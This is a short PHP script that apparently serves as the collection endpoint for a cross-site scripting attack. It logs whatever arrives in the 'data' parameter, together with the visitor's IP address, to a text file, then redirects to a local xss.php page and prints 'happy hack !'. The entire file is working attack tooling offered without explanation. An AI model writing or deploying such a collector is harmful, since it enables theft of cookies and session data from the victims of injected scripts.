<?php
$data = $_GET['data']."|{$_SERVER['REMOTE_ADDR']}";
file_put_contents('userdata.txt', $data. PHP_EOL , FILE_APPEND | LOCK_EX);
header('location: http://localhost/xss.php');

echo "happy hack !";

?>
